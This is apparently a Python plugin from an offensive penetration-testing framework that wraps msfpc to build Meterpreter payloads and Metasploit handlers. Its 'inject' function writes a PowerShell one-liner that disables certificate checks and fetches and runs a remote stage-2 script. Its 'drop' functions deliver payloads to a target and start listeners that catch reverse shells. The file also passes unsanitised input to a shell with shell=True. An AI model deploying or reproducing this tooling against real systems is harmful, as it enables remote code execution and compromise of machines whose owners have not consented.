import shlex
import os
import imp
import subprocess
from .. import plugin
import re

ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
MSFPC_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mpc", "msfpc.sh")

def get_cmds():
    return ['msfpc', 'inject', 'drop', 'drop_meterpreter', 'catch_rc']

#cmd_str = Raw user input
# args = everything but the msfpc part (best effort)
def _msfpc(cmd_str, arg_str=""):
    target = plugin._get_target()
    if not target:
        target = ""
    dirs = plugin._get_dirs()
    #args = shlex.split(arg_str)
    #args.prepend(MSFPC_PATH)
    arg_str = "{} {} {}".format("{LHOST}", "{LPORT}", arg_str)
    arg_str = plugin._replace_vars(arg_str, plugin._get_default_vars())
    # WARNING: NOT SAFE
    payloads = dirs.get('payloads_dir', "./")
    handlers = dirs.get('handlers_dir', "./")
    #print(payloads)
    #print(handlers)
    payloads = os.path.join(payloads, target)
    handlers = os.path.join(handlers, target)
    os.makedirs(payloads, exist_ok=True)
    os.makedirs(handlers, exist_ok=True)

    arg_str = "cd {}; {} {}".format(payloads, MSFPC_PATH, arg_str)
    print(arg_str)
    print("(This may take a minute...)")
    p = subprocess.run(arg_str, shell=True, check=True, stdout = subprocess.PIPE, stderr=subprocess.STDOUT)
    output = p.stdout.decode('utf-8')
    
    print(output)

    #rc = []
    #for file in os.listdir(payloads):
    #    if file.endswith(".rc"):
    #        os.rename(os.path.join(payloads, file), os.path.join(handlers, os.path.basename(file)))
    #        rc.append(file)
    
    payload = None
    handler = None
    for line in output.splitlines():
        s = "created: "
        if s in line:
            i = line.index(s)
            payload = line[i+len(s):].strip("'")
        
        s = "MSF handler file: "
        if s in line:
            i = line.index(s)
            handler = line[i+len(s):].strip("'")
    if payload and handler:
        #print("Payload: {}".format(payload))
        #print("Handler: {}".format(handler))
        tmp = handler
        handler = os.path.join(handlers, os.path.basename(handler))
        os.rename(tmp, handler)

    return ansi_escape.sub('', payload), handler    

def _patch_handler(handler):
    with open(handler, "r") as f:
        lines = f.readlines()
        for i,l in enumerate(lines):
            if l.startswith("set LHOST"):
                lines[i] = "set LHOST {LHOST}"
            elif l.startswith("set LPORT"):
                lines[i] = "set LPORT {REAL_PORT}"
            elif l.startswith("#"):
                lines[i] = ""
        cmd = "; ".join([x.strip() for x in lines if x])
        print(cmd)
            
    return "msfconsole -qx {};".format(shlex.quote(cmd))

def msfpc(cmd_str, arg_str=""):
    _msfpc(cmd_str, arg_str)

def _rename(path, name):
    dirname = os.path.dirname(path)
    new_path = os.path.join(dirname, name)
    os.rename(path, new_path)
    return new_path

def drop(cmd_str, arg_str=""):
    return drop_meterpreter(cmd_str, arg_str)

def inject(cmd_str, arg_str):
    if not "ps1" in arg_str:
        print("This method only works for powershell (ps1) payloads")
        return

    arg_str, outname = plugin.get_filename(arg_str)
    payload, handler = _msfpc(cmd_str, arg_str) 
    if outname:
        payload = _rename(payload, outname)
    url = plugin.cp_to_static(payload)
    print("Stage 2 ready at : {}".format(url))
    handler_cmd = _patch_handler(handler)

    loader = 'powershell.exe -c \'[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }; iex(New-Object Net.WebClient).DownloadString("'+ url +'") ;\' '

    return plugin._inject_tool(loader, handler_cmd)

    print(cmds)
    return cmds

def drop_meterpreter(cmd_str, arg_str=""):
    target = plugin._get_target()
    if not target:
        print("Set target first!")
        return
    arg_str, outname = plugin.get_filename(arg_str)
        
    payload, handler = _msfpc(cmd_str, arg_str)
    if outname:
       payload = _rename(payload, outname)
       handler = _rename(handler, "{}.rc".format(outname.rsplit(".", 1)[0]) )
    #handler_cmd = "msfconsole -qr {};".format(handler)
    handler_cmd = _patch_handler(handler)
    #cmds = []
    #cmds.append("upload {}".format(payload))
    #cmds.append(
    #  "_shell {} {}".format(
    #    shlex.quote("execute_file {}".format(os.path.basename(payload)) )
    #    , shlex.quote(handler_cmd) )
    #)
    #print(cmds)
    #return cmds
    return plugin._drop_tool(payload, handler_cmd)

def catch_rc(filename):
    return plugin.prepare_listener("msfconsole -qr {}".format(filename))
